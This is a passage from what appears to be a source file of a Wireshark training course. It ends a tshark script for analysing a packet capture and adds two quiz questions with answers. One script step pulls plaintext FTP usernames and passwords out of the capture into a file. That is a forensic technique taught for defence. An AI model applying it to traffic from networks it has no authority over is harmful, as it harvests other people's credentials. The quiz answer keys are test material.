echo "[3/5] Find DNS queries to known bad domains"
tshark -r "$PCAP" -Y "dns.flags.response == 0" -T fields \
  -e dns.qry.name > "$OUTDIR/dns-queries.txt"

echo "[4/5] TLS certificate analysis"
tshark -r "$PCAP" -Y "tls.handshake.certificate" -T fields \
  -e tls.handshake.certificate > "$OUTDIR/certs.bin"

echo "[5/5] Extract credentials from protocols"
tshark -r "$PCAP" -Y "ftp.request.command == USER || ftp.request.command == PASS" \
  -T fields -e ftp.request.arg > "$OUTDIR/ftp-creds.txt"

echo "Done — output in $OUTDIR/"
\`\`\`

Mastering these advanced techniques separates script kiddies from real security analysts. Practice on public packet captures from malware-traffic-analysis.net and the Wireshark sample captures page.`, { hasQuiz: true, quiz: [
        { id: 'ws-9-q1', question: 'How can you decrypt TLS traffic in Wireshark from a browser session?', options: ['Use the server\'s private key', 'Set SSLKEYLOGFILE before starting the browser', 'Use an intercepting proxy', 'It\'s impossible'], correctIndex: 1, explanation: 'Firefox and Chrome support SSLKEYLOGFILE environment variable, which writes session keys that Wireshark can use for decryption.' },
        { id: 'ws-9-q2', question: 'Which Wireshark filter shows TCP retransmissions?', options: ['tcp.flags.syn == 1', 'tcp.analysis.retransmission', 'tcp.window_size == 0', 'tcp.stream eq 0'], correctIndex: 1, explanation: 'tcp.analysis.retransmission is an expert-info filter that highlights packets that had to be retransmitted, indicating network issues.' },
      ] }),
  ],
};
